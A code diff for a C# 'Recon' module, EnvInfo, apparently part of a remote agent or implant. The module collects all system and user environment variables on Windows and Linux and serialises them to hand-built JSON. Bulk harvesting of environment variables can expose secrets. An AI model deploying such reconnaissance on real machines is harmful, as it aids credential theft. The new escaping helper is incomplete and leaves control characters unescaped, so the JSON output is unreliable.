@@ -1,5 +1,4 @@
 using System.Runtime.InteropServices;
-using System.Text.Json;
 using Microsoft.Win32;
 
 namespace LibraNextgen.Agent.Modules.Recon;
@@ -59,8 +58,8 @@ public static class EnvInfo
 
     private static string CollectWindows()
     {
-        var system = new List<object>();
-        var user = new List<object>();
+        var systemItems = new List<string>();
+        var userItems = new List<string>();
 
         try
         {
@@ -71,7 +70,7 @@ public static class EnvInfo
                 foreach (var name in sysKey.GetValueNames())
                 {
                     var val = sysKey.GetValue(name, "")?.ToString() ?? "";
-                    system.Add(new { name, value = val });
+                    systemItems.Add($$"""{"name":"{{Esc(name)}}","value":"{{Esc(val)}}"}""");
                 }
             }
         }
@@ -85,22 +84,26 @@ public static class EnvInfo
                 foreach (var name in userKey.GetValueNames())
                 {
                     var val = userKey.GetValue(name, "")?.ToString() ?? "";
-                    user.Add(new { name, value = val });
+                    userItems.Add($$"""{"name":"{{Esc(name)}}","value":"{{Esc(val)}}"}""");
                 }
             }
         }
         catch { }
 
-        return JsonSerializer.Serialize(new { system, user });
+        return $$"""{"system":[{{string.Join(",", systemItems)}}],"user":[{{string.Join(",", userItems)}}]}""";
     }
 
     private static string CollectLinux()
     {
-        var vars = new List<object>();
+        var items = new List<string>();
         foreach (System.Collections.DictionaryEntry entry in Environment.GetEnvironmentVariables())
         {
-            vars.Add(new { name = entry.Key?.ToString() ?? "", value = entry.Value?.ToString() ?? "" });
+            var name = entry.Key?.ToString() ?? "";
+            var value = entry.Value?.ToString() ?? "";
+            items.Add($$"""{"name":"{{Esc(name)}}","value":"{{Esc(value)}}"}""");
         }
-        return JsonSerializer.Serialize(new { system = vars, user = Array.Empty<object>() });
+        return $$"""{"system":[{{string.Join(",", items)}}],"user":[]}""";
     }
+
+    private static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
 }
